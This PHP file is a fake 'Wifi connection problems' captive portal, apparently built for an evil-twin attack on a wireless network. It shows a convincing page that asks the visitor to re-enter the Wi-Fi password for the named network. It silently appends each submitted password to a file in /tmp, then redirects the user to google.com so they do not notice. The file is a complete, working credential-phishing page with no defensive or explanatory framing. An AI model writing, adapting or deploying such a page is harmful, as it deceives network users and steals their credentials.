<?php
// Landing page configuration
$SSID = 'ExampleSSID';

// Landing page content
if (isset($_POST['wifi_password']) && !empty(trim($_POST['wifi_password']))) {
  $data = $SSID . ':' . htmlspecialchars(trim($_POST['wifi_password'])) . "\n";
  file_put_contents('/tmp/wifi-passwords.txt', $data, FILE_APPEND | LOCK_EX);
  header("Location: https://google.com");
} else {
  echo '<!DOCTYPE HTML><html lang="en-US"><head>';
  echo '<title>' . $SSID . ' Connection Failure</title>';
  echo '<meta charset="utf-8">';
  echo '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">';
  echo '<meta name="generator" content="' . $SSID . '">';
  echo '<style>';
  echo 'html, body {';
  echo '  font-family: Helvetica, sans-serif;';
  echo '  background: #f3f2f2;';
  echo '}';
  echo 'h1 {';
  echo ' padding-bottom: 20px;';
  echo ' border-bottom: 1px solid #eee;';
  echo ' font-size: 25px;';
  echo ' color: #4288CC;';
  echo '}';
  echo 'p {';
  echo ' margin-bottom: 20px;';
  echo ' padding-bottom: 20px;';
  echo ' font-size: 15px;';
  echo ' color: #777;';
  echo ' border-bottom: 1px solid #eee;';
  echo '}';
  echo 'input {';
  echo ' padding: 5px;';
  echo '}';
  echo '.center {';
  echo '  margin: 150px auto auto auto;';
  echo '  padding: 20px;';
  echo '  width: 450px;';
  echo '  text-align: center;';
  echo '  border: 1px solid #ccc;';
  echo '  border-radius: 5px;';
  echo '  background: #fff;';
  echo '  box-shadow: 4px 4px 5px 0px rgba(50, 50, 50, 0.75);';
  echo '}';
  echo '</style></head>';
  echo '<div class="center">';
  echo '<h1>Wifi connection problems</h1>';
  echo '<p>Please enter your wifi password for "' . $SSID . '" <br> and press "Reconnect" to solve this issue.</p>';
  echo '<form method="POST" action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '">';
  echo '<input type="password" name="wifi_password" size="35" maxlength="65"> ';
  echo '<input type="submit" name="submit" value="Reconnect">';
  echo '</form></div></html>';
}
